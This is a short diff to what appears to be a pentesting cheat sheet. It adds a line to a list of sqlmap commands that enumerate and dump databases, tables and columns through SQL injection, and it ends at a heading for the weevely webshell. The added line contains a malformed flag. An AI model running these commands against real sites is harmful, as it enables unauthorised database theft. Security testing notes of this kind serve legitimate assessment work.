@@ -72,6 +72,7 @@ sudo sqlmap -u "https://url" --cookie="<COOKIE>" --dbs
 sudo sqlmap -u "https://url" --cookie="<COOKIE>" -D DB_name --tables
 sudo sqlmap -u "https://url" --cookie="<COOKIE>" -D DB_name -T Table_name --columns --technique=B
 sudo sqlmap -u "https://url" --cookie="<COOKIE>" -D DB_name -T Table_name --dump --technique=B
+sudo sqlmap -u "https://url" --forms --crawl=2 -dbs
 ```
 ## _weevely_
 Webshell
